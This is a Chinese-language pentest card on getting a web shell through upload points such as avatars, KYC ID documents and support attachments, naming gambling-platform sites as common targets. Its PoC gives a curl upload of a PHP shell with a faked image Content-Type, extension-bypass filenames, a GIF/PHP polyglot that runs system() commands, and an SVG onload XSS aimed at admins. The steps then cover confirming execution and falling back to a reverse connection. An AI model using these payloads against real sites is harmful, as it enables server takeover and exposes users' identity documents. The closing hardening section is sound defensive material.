---
title: 上传点 getshell（头像 / KYC 证件 / 客服附件）
cve: 无（实现缺陷；配合中间件解析差异）
severity: critical
cvss: 9.0
product: 自研站上传点（博彩包网、代理后台高发）
versions: 任意
ports: 80, 443
keywords: upload, getshell, 头像, kyc, 二次渲染, 双扩展名, svg xss
verified: false
sources: 公开资料整理（业务逻辑 / 实现 / 配置缺陷类，无 CVE；出处见文末参考）
---

## 指纹

- 上传点：头像、实名认证（KYC）证件、客服 IM 附件、活动海报、充值凭证截图；
- 返回直链：`/uploads/2024/11/xxx.jpg`、`oss-cn-*/bucket/...`；
- 响应里带 `url`、`path`、`fileName` 字段。

## 前置条件

- 注册账号（多数站点注册即可上传头像/证件）。
- 上传只在前端校验（改包即可绕过）或只校验 `Content-Type`。

## PoC

```bash
# 1) 直接可执行后缀（Content-Type 伪装成图片）
curl -s -X POST http://target/api/upload/avatar \
  -H "Authorization: Bearer <token>" \
  -F "file=@shell.php;type=image/png;filename=shell.php"

# 2) 双扩展名 / 大小写 / 特殊后缀（按中间件选）
shell.php.jpg   shell.phtml   shell.pHp   shell.php%00.jpg   shell.php.  shell.php::

# 3) 图片马（前缀 GIF89a 或真实 JPEG，尾部拼 PHP）
printf 'GIF89a<?php system($_GET[c]);?>' > p.gif

# 4) SVG（后台客服/审核端查看时触发 XSS，可打管理端）
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
```

先传一个纯 `.txt` 确认"能否访问、路径是否可猜"，再换后缀；有些站只做**二次渲染**（重新压缩图片），这时改用 GIF 头 + 注释段、EXIF 写入、或 SVG。

## 利用步骤

1. 枚举所有上传点，记录返回路径规则（`/uploads/yyyy/mm/` 可猜）。
2. 判定顺序：可执行后缀 → 双扩展/解析差异 → 二次渲染绕过 → 结合已有 LFI（图片马）。
3. 成功后 `phpinfo`/`whoami` 确认执行身份，看 `disable_functions`、`open_basedir`；受限于 `open_basedir` 时改用同目录写文件或反连。
4. 有些站的上传落 OSS 且绑了自定义域名（可解析 PHP）——比普通目录更好用。
5. 落地后清理：删你自己的文件；报告里给出文件名与访问 URL 作为证据。

## 修复与缓解（加固）

- 白名单后缀 + 服务端重命名（UUID）+ 存到非 webroot 或独立无解析域名。
- 校验 magic bytes 并做图片重编码（GD/ImageMagick）；SVG 一律转 PNG 或直接拒绝。
- 上传目录关闭脚本解析（`location ~* /uploads/.*\.(php|jsp)$ { deny all; }`）。
- 归档/压缩包上传要防解压穿越（`zip slip`）。

## 参考

- OWASP File Upload Cheat Sheet；WSTG-BUSL-09。
